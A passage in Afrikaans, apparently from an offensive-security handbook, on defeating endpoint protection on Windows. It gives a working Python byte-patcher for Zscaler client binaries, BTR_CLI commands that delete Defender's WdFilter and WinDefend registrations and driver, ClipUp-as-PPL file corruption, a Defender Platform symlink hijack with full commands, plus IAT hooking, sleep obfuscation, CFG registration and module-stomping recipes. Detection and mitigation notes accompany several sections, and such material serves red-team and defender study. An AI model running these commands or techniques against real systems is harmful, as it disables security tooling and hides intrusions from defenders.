Deur **vier ondertekende binaries op skyf te pleister**, kan albei meganismes geneutraliseer word:

| Binêre lêer | Oorspronklike logika wat gepleister is | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug sodat elke kontrole aan die vereistes voldoen |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige proses (selfs een wat nie onderteken is nie) kan aan die RPC-pipes koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tunnel | Kortgesluit |

Minimale patcher-uittreksel:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang en die diensstapel herbegin is:

* **Alle** posture checks vertoon **groen/voldoenend**.
* Ongesignede of gewysigde binaries kan die genoemde-pyp-RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met ’n paar byte-patches omseil kan word.

## Microsoft Defender `BTR.sys` misbruik van vertroude funksionaliteit

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige, deur Microsoft ondertekende remediëringskomponent sonder ’n geheuekorrupsie-fout of IOCTL-koppelvlak; nadat administrateurstoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private remediëringstransaksie vervals en die bedoelde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **post-compromise AV/EDR-neutralization primitive, nie aanvanklike toegang of privilege escalation nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-hulpbron `BOOTTIMETOOL` onttrek word, pleks daarvan om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender plaas gewoonlik die hulpbron as ’n ewekansige `[a-z]{8}.sys`-lêer en registreer ’n kernel-diens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, maak die verwysde NTFS ADS oop, dekripteer en valideer die aksielys, skryf terugvoer, en gee `0xC0000056` (`STATUS_DELETE_PENDING`) terug ná suksesvolle uitvoering sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die geanaliseerde builds hergebruik ’n vaste 256-greep-sleutel, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale kopskrif van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, kopskrif-CRC en ’n transaksie-ID wat van die payload afgelei is), gevolg deur ’n NUL-getermineerde UTF-16-feedbackpad en enige aantal items. Elke item het ’n kopskrif van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) plus aksiespesifieke data wat met **presies vier NUL-grepe** eindig. Elke kopskrif-/datastreek word onafhanklik nagegaan met CRC-32-polinoom `0xEDB88320`, aanvanklike toestand `0xFFFFFFFF` en **geen finale XOR** (`~CRC32`); die CRC-toestand word vir elke streek teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe bloot.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Vee ’n lêer uit, insluitend ’n geslote lêer |
| 2 | `[UTF-16 path]` | Verwyder ’n leë gids |
| 3 | `[Flags][source][destination]` | Skuif ’n lêer na ’n aanvallergekose beskermde pad; ’n leë bestemming beteken uitvee |
| 4 | `[Flags][key path]` | Vee ’n register-sleutel rekursief uit |
| 5 | `[Flags][key path + "\\" + value]` | Vee ’n registerwaarde uit |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Skep/werk ’n registerwaarde by en skep ontbrekende sleutelpaadjies |

Vir aksies 5 en 6 is die sleutelwaarde-skeidingsteken op die draad **twee opeenvolgende backslashes**; ’n pad met konvensionele formatering sal nie korrek opgesplit word nie. Die feedback-lêer weerspieël meestal die versoek, maar die eerste vier grepe van elke item se data word die resulterende `NTSTATUS`. Vir aksies 1 en 2, wat nie ’n voorste flags-veld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek vir daardie status te maak.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeë-boot-tydvenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: onttrek `BTR.sys` uit plaaslike Defender, skep `<random>.sys:changelist` en ’n feedback-stroom, serialiseer/kontroleer somme/kripteer gekoppelde aksies, skep die diens se register-sleutel direk en roep dan `NtLoadDriver` aan vir `-trigger now`, of laat dit as ’n stelselbeginbestuurder vir `-trigger boot`. Direkte registervoorbereiding vermy die normale SCM `CreateServiceW`-pad en veroorsaak dus **nie** diensinstallasie-Event ID 7045 nie. Artefakte wat deur ’n selflaaitrigger geskep is, kan later verwyder word met `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die stoorstapel en die `SystemRoot`-skakel gereed is. `Start=1` plus die hoëprioriteit-`Boot Bus Extender`-groep word eerder in Fase 1 uitgevoer: NTFS is bruikbaar, maar baie sekuriteitsdrywers wat met die stelsel begin en EDR-dienste in gebruikersmodus is nog nie geïnisialiseer nie. Filters wat tydens selflaai begin, soos `WdFilter`, is moontlik reeds gelaai, maar BTR kan hul binaries of dienskonfigurasie verwyder voordat die volgende begin, en kan diensuitvoerbare lêers uitvee voordat SCM hulle begin. ELAM sluit hierdie gaping nie omdat BTR ná die evaluering van selflaaidiensprogramme loop en ’n geldige Microsoft-handtekening het nie.<sup>[[36]](#references)</sup>

Verskeie aksies word in een transaksie uitgevoer. Die PoC plaas Aksie 1 vooraan vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, verwerk dan sy eie uitveeversoek en verwyder dit voordat dit ontlaai. Dit verminder bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` geplaas kan word sodat die drywer en albei strome saam verwyder kan word.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelasies vir opsporing met hoë seinwaarde

Reëls wat slegs op handtekeninge staatmaak, en die Microsoft-lys van geblokkeerde kwesbare drywers, spreek nie misbruik van BTR se bedoelde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, en onderskei terselfdertyd wettige Defender-afstamming van ’n willekeurige lanseerder.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Skepping van `.sys:changelist` is universeel vir BTR-stadiëring. ’n `.dat` ADS wat aan dieselfde `.sys` gekoppel is, is besonder verdag omdat wettige Defender terugvoer gewoonlik onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` plaas.
- **Sysmon 12/13 sonder System 7045:** korreleer direkte skepping van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wat `Args=...:changelist` en `Group=Boot Bus Extender` bevat met die afwesigheid van ’n ooreenstemmende SCM-installasiegebeurtenis.
- **Sysmon 6 -> 23:** korreleer ’n bekende BTR-drywerlading wat nie van Defender afstam nie met daaropvolgende lêeruitwissing wat aan `System`/PID 4 toegeskryf word, veral vir sekuriteitsbinaries.
- **Sysmon 11 -> 23:** waarsku oor vinnige skepping en uitwissing van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; ’n Microsoft-handtekening alleen is nie voldoende rede vir vertroue wanneer ’n sekuriteitnutsding se drywer deur `cmd.exe`, PowerShell of ’n onbekende proses gestadieer word nie.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te peuter

Protected Process Light (PPL) dwing ’n ondertekenaar-/vlakhiërargie af sodat slegs beskermde prosesse van dieselfde of ’n hoër vlak met mekaar kan peuter. Aanvallend gesproke, as jy ’n PPL-geaktiveerde binary wettig kan begin en die argumente daarvan kan beheer, kan jy onskadelike funksionaliteit (bv. aantekening) omskep in ’n beperkte, PPL-gesteunde skryfprimitief teen beskermde gidse wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat ’n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL’s) moet met ’n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word deur die vlae te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Versoenbare beskermingsvlak moet aangevra word wat by die ondertekenaar van die binary pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal tydens skepping misluk.

Sien ook hier ’n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Lanseerdernutsmiddels
- Oopbronhelper: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente aan die teiken-EXE deur):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruiksvoorbeeld:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Die getekende stelselbinary `C:\Windows\System32\ClipUp.exe` begin homself en aanvaar ’n parameter om ’n loglêer na ’n pad te skryf wat deur die oproeper gespesifiseer word.
- Wanneer dit as ’n PPL-proses geloods word, vind die lêerskryf met PPL-ondersteuning plaas.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te verwys.

8.3-kortpadhelpers
- Lys kort name: `dir /x` in elke ouergids.
- Lei die kort pad in cmd af: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruiksketting (abstrak)
1) Loods die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp-logpadargument deur om ’n lêer in ’n beskermde AV-gids te skep (bv. Defender Platform). Gebruik 8.3-kort name indien nodig.
3) As die AV gewoonlik die teikenbinary oop of gesluit hou terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryfaksie tydens selflaai, voordat die AV begin, deur ’n outostartdiens te installeer wat betroubaar vroeër loop. Bevestig die selflaaivolgorde met Process Monitor (selflaailogging).
4) By herlaai vind die PPL-ondersteunde skryfaksie plaas voordat die AV sy binaries sluit, wat die teikenlêer beskadig en die AV se opstart verhoed.

Voorbeeldoproep (paaie is vir veiligheid geredigeer/verkort):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas en beperkings
- Jy kan nie die inhoud beheer wat ClipUp skryf nie, net waar dit geskryf word; dié primitive is geskik vir korrupsie eerder as presiese inhoudinspuiting.
- Vereis plaaslike admin/SYSTEM om ’n diens te installeer/te begin, asook ’n herlaaivenster.
- Tydsberekening is krities: die teiken mag nie oop wees nie; uitvoering tydens selflaai vermy lêersluitings.

Opsporing
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard launchers as ouerproses begin word, rondom selflaai.
- Nuwe dienste wat ingestel is om verdagte binaries outomaties te begin en konsekwent vóór Defender/AV begin. Ondersoek dienskepping/-wysiging voordat Defender se opstartfoute voorkom.
- Lêerintegriteitsmonitering van Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en anomale gebruik van PPL-vlakke deur nie-AV-binaries.

Versagtingsmaatreëls
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Dienshigiëne: beperk die skep/wysiging van outo-begindiens­te en monitor manipulasie van beginvolgorde.
- Maak seker dat Defender-tamperbeskerming en vroeë-beginbeskerming geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om 8.3-kortnaamskepping te deaktiveer op volumes wat sekuriteitsnutsgoed huisves, indien dit met jou omgewing versoenbaar is (toets deeglik).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende pad te lys:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse daarvandaan (en werk die diens-/registerpaaie dienooreenkomstig by). Hierdie keuse vertrou gidsinskrywings, insluitend gids-herontledingspunte (symlinks). ’n Administrateur kan dit benut om Defender na ’n aanvaller-skryfbare pad te herlei en DLL-sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrator (nodig om gidse/symlinks onder die Platform-gids te skep)
- Vermoë om te herlaai of Defender-platformherkeuse te aktiveer (diensherbegin tydens selflaai)
- Slegs ingeboude nutsgoed benodig (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformkeuse vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te verifieer dat die teiken na ’n beskermde/betroubare pad verwys.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n gidssymlink met ’n hoër weergawe binne Platform wat na jou vouer wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Keuse van trigger (herlaai word aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` waar te neem, en te sien dat die dienskonfigurasie/register na daardie ligging verwys.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas of vervang DLLs wat Defender uit sy programgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat die gekonfigureerde pad nie met die volgende begin oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sigself privilege escalation bied nie; dit vereis adminregte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime-evasion uit die C2-implantaat en na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde API's deur aanvallerbeheerde, posisie-onafhanklike kode (PIC) te stuur. Dit veralgemeen evasion buite die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation-DLL's.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Benadering op hoë vlak
- Plaas 'n PIC-blob saam met die teikenmodule deur 'n reflective loader te gebruik (vooraf bygevoeg of as metgesel). Die PIC moet selfstandig en posisie-onafhanklik wees.
- Wanneer die gasheer-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC-wrappers wys.
- Elke PIC-wrapper voer evasions uit voordat dit die regte API-adres met 'n tail-call aanroep. Tipiese evasions sluit in:
  - Geheuemaskering/-ontmaskering rondom die aanroep (bv. enkripteer beacon-streke, RWX→RX, verander bladsynaamtoekennings/-toestemmings) en herstel dit ná die aanroep.
  - Call-stack spoofing: bou 'n onskadelike stack en skakel oor na die teiken-API sodat call-stack-analise die verwagte rame vind.<sup>[[9]](#references)</sup>
- Voer vir versoenbaarheid 'n koppelvlak uit sodat 'n Aggressor-script (of ekwivalent) kan registreer watter API's vir Beacon, BOFs en post-exploitation-DLL's gehook moet word.

Waarom IAT hooking hier
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool-kode te wysig of daarop staat te maak dat Beacon spesifieke API's as proxy gebruik.
- Dek post-exploitation-DLL's: deur LoadLibrary* te hook, kan jy module-laaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde maskering-/stack-evasion op hul API-aanroepe toepas.
- Herstel betroubare gebruik van post-exploitation-opdragte wat prosesse skep teen call-stack-gebaseerde opsporing deur CreateProcessA/W te wrap.

Minimale IAT-hook-skets (x64 C/C++-pseudokode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe ná relocations/ASLR en voor die import die eerste keer gebruik word. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens die DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; resolve die ware API via die oorspronklike IAT-waarde wat jy vasgelê het voordat jy patch, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy bladsye wat tegelyk skryfbaar en uitvoerbaar is.

Call-stack spoofing stub
- Draugr-styl PIC-stubs bou ’n vals call chain (return addresses binne onskadelike modules) en spring dan na die werklike API.
- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer met stack cutting/stack stitching-tegnieke om binne verwagte frames te land voordat die API-proloog uitgevoer word.

Operasionele integrasie
- Plaas die reflective loader vooraan post-ex-DLLs sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor-script om teiken-APIs te registreer sodat Beacon en BOFs deursigtig by dieselfde evasion path baat vind, sonder kodeveranderings.

Detection/DFIR-oorwegings
- IAT-integriteit: entries wat na adresse buite images (heap/anon) resolve; periodieke verifikasie van import-pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image PIC; onkonsekwente RtlUserThreadStart-afstamming.
- Loader-telemetrie: writes na die IAT binne die proses, vroeë DllMain-aktiwiteit wat import-thunks wysig, onverwagte RX-areas wat tydens laai geskep word.
- Image-load-evasion: as jy LoadLibrary* hook, monitor verdagte laaie van automation/clr-assemblies wat met memory-masking-events saamval.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory-masking-hooks (bv. simplehook) en stack-cutting-PIC (stackcutting)
- PIC call-stack-spoofing-stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT-hooks via ’n inwonende PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer te vervang met ’n pasgemaakte resolver wat hooks eerste nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **inwonende PICO** (persistent PIC object) wat bly bestaan nadat die tydelike loader-PIC homself vrygestel het.
- Export ’n `setup_hooks()`-funksie wat die loader se import-resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan ordinal-imports in `_GetProcAddress` oor en gebruik ’n hash-gebaseerde hook-opsoek soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; anders delegeer na die werklike `GetProcAddress`.
- Registreer hook-teikens tydens linking met Crystal Palace `addhook "MODULE$Func" "hook"`-inskrywings. Die hook bly geldig omdat dit binne die inwonende PICO leef.

Dit lewer **import-time IAT-redirection** sonder om die gelaaide DLL se kodesection ná laai te patch.

### Dwing hookable imports af wanneer die teiken PEB-walking gebruik

Import-time hooks word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash resolve (sonder ’n import-entry), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit kan sien:

- Vervang hashed export-resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-entry, wat interception moontlik maak wanneer die reflective loader imports resolve.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, omvou die call in ’n Ekko-styl obfuscation-chain wat die in-memory image gedurende idle versleutel:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met saamgestelde `CONTEXT`-frames aanroep.
- Tipiese chain (x64): stel image op `PAGE_READWRITE` → RC4-enkripteer via `advapi32!SystemFunction032` oor die volledige gemapte image → voer die blocking wait uit → RC4-dekripteer → **herstel permissions per section** deur PE-sections te deurloop → dui voltooiing aan.
- `RtlCaptureContext` verskaf ’n `CONTEXT`-sjabloon; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele besonderheid: gee “success” terug vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon versteek die module vir scanners tydens idle-vensters en vermy die klassieke “patched `Sleep()`”-signature.

Detection-idees (gebaseer op telemetrie)
- Groepe `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers so groot soos ’n image gebruik word.
- Groot `VirtualProtect`-reekse gevolg deur pasgemaakte herstel van permissions per section.

### Runtime CFG-registrasie vir sleep-obfuscation-gadgets

Op CFG-geaktiveerde teikens sal die eerste indirecte sprong na ’n mid-function-gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die CFG-metadata van die module voorkom nie. Om Ekko/Kraken-styl chains binne geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirecte bestemming wat die chain gebruik met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-entries.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`), moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volledige image-grootte** dek.
- Gebruik eerder die **allocation base** en allocation-grootte vir handmatig gemapte/PIC/stomped-areas.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige aanvallerbeheerde uitvoerbare sections wat indirekte teikens sal word.

Dit verander ROP/JOP-styl sleep-chains van “werk net in prosesse sonder CFG” in ’n herbruikbare primitive vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` gecompileer is.

### CET-veilige stack-spoofing vir slapende threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels breek, omdat ’n vervalste `Rip` steeds met die hardeware-shadow-stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Rugsteun die huidige thread se werklike TEB/TIB.
- Leg die werklike slapende context vas met `GetThreadContext`.
- Kopieer **slegs** die werklike `Rip` na die spoof-context en laat die vervalste `Rsp`/stack-status onveranderd.
- Kopieer gedurende die slaapvenster die spoof-thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n geldige stack-reeks unwind.
- Herstel ná die wait die oorspronklike TIB en thread-context.

Dit behou ’n CET-konsekwente instruction pointer terwyl dit EDR-stack walkers mislei wat TEB-stackmetadata vertrou om unwinds te valideer.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te herkenbaar is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanaf ’n opgeskorte helper-thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper-thread met `NtTestAlert` as entrypoint.
- Queue vooraf voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en dreineer hulle met `NtAlertResumeThread`.
- Stoor die chain-status op die heap in plaas van die helper-stack om te verhoed dat die verstek-thread-stack van 64 KB opgebruik word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start-event atomies te sein en te blokkeer.
- Suspend die main thread voordat die TIB/context herstel word (`NtSuspendThread` → herstel → `NtResumeThread`) om die wedrenvenster waarin ’n scanner ’n halfherstelde stack kan vang, te verklein.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-signature met ’n helper-thread/APC-signature, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behoue bly.

Bykomende detection-idees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` om `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe`.
- `NtQueryInformationThread` gevolg deur direkte writes na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-chains wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir die herstel van section-permissions bereik.
- Herhaalde gebruik van kort gadget-signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch-pivots binne getekende modules.


## Precision Module Stomping

Module stomping voer payloads uit die **`.text`-section van ’n DLL wat reeds binne die teikenproses gemap is** uit, in plaas daarvan om duidelike private uitvoerbare geheue te allokeer of ’n nuwe sacrificial DLL te laai. Die overwrite-teiken moet ’n **gelaaide, skyf-ondersteunde image** wees waarvan die kodespasie die payload kan akkommodeer sonder om kodepaaie te korrupteer wat die proses nog benodig.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die remote proses gelaai nie, en ’n te klein kode-area sal die proses laat crash. ’n Betroubaarder werksvloei is:

1. Lys die teikenproses se modules en behou ’n **name-only-include-list** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese aantal bytes** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-section **`.text` `Misc_VirtualSize`** met die payload-grootte. Dit is belangriker as die lêergrootte, want dit weerspieël die grootte van die uitvoerbare section **wanneer dit in geheue gemap is**.
4. Ontleed die **Export Address Table (EAT)** en kies ’n exported function-RVA as die stomp se begin-offset.
5. Bereken die **ontploffingsradius**: as die payload die gekose funksiegrens oorskry, sal dit aangrensende exports oorskryf wat daarna in geheue geplaas is.

Tipiese recon-/keusehelpers wat in die praktyk voorkom:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Bedryfsnotas
- Verkies DLLs wat **reeds gelaai** is in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat die teikentoepassing selde uitvoer; anders kan normale kodepaaie die gestompte grepe tref voor of ná draadskepping.
- Groot implants vereis dikwels dat die inbedding van shellcode verander word van ’n string literal na ’n **byte-array/braced initializer**, sodat die volledige buffer korrek in die injector-bronkode verteenwoordig word.

Opsporingsidees
